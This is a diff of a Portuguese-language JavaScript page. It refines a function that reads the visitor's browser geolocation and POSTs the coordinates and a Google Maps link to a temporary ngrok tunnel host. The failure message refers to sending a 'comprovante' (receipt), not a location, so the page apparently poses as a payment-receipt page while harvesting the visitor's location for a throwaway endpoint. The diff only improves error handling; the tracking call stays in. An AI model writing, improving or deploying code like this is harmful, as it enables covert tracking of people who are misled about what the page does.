@@ -48,28 +48,40 @@
 
     console.log(dataAtual)
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  function sendLocation(position) {
+  if (!position || !position.coords) {
+    console.error("Posição inválida.");
+    return;
+  }
 
-      fetch("https://d8d0-201-42-106-118.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+  fetch("https://d8d0-201-42-106-118.ngrok-free.app/send-location", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ latitude, longitude, maps })
+  })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`Erro HTTP: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      if (!data.success) {
+        alert("Erro ao enviar o comprovante.");
+      } else {
+        console.log("Localização enviada com sucesso.");
+      }
+    })
+    .catch(error => {
+      console.error("Erro ao enviar localização:", error);
+    });
+}
 
     function handleError(error) {
       alert("Erro ao obter a localização: " + error.message);
